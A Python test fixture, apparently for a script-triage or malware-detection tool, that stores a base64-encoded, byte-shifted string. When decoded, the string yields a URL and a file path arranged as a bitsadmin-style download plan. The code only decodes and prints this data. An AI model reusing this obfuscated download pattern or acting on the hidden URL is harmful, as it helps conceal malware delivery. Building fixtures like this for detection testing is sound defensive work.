#!/usr/bin/env python3

# Huntress Script Triage -- inert static-analysis fixture (cpython3)

import base64

import io

import os



MATERIAL_be209903 = "aC8kbmVmV2JlL1NVY2dbZFdRZFdfYWZXHmlkW2ZXUVhbXlduU1ZTYmZXZC9UW2ZlU1ZfW2BRYmRXVldVV2VlYWRRYl5TYG5lZlNZV1FVYWdgZi8jbmVrYGZTai9ZV2BXZFNmYWRRYltiV15bYFduYVRYZ2VVU2ZbYWAvWGVmZFtgWVFYZFNZX1dgZmVuVVNkZFtXZC9ia1tgZWZTXl5XZFFhYFdYW15XbmlbYFZhaWVRVVpTW2AvX2VaZlNRZmFRYmtmWmFgblVTX2JTW1lgUVtWL1VTX2JTW1lgHyQkKiVYJiQiVCpuZ2ReL1pmZmJlLCEhJCQqJVgmJCJUKiBXalNfYl5XIFtgaFNeW1YhJyNVJCRTKSUgYmtuZ2VXZFFTWVdgZi86Z2BmZFdlZUJrZlphYCEkJColWCYkIlQqblhbXldRYlNmWi81LCFCZGFZZFNfNlNmUyE6Z2BmZFdlZT5TVCEgZ2JWU2ZXHyQkKiVYJiQiVCogYms="

CODEC_be209903 = "urlsafe_base64|subtract_modulo_256|0e"



def load_be209903():

    return base64.urlsafe_b64decode(MATERIAL_be209903)



def decode_be209903(e):

    return bytes((value + 14) % 256 for value in e)



def recover_be209903():

    n = None

    for _pass in range(1):

        d = decode_be209903(load_be209903())

    t = d.decode("ascii", "strict")

    return t



def inspect_be209903():

    view = memoryview(recover_be209903().encode("ascii"))

    return bytes(view).decode("ascii")



def surface_be209903():

    stream = (item for item in ("generator_pipeline", "fstring_fragments", "pyinstaller_onefile", "mshta_to_python"))

    return tuple(stream)



def obfuscation_be209903():

    left, right = "fstrin", "g_fragments"

    return f"{left}{right}"



def plan_be209903():

    fields = dict(item.split("=", 1) for item in inspect_be209903().split("|"))

    analysis_surface = surface_be209903()

    obfuscation_surface = obfuscation_be209903()

    operation_plan = ("bitsadmin_predecessor_plan", fields["url"], fields["file_path"])

    return operation_plan + (analysis_surface, obfuscation_surface)



if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":

    print(inspect_be209903())

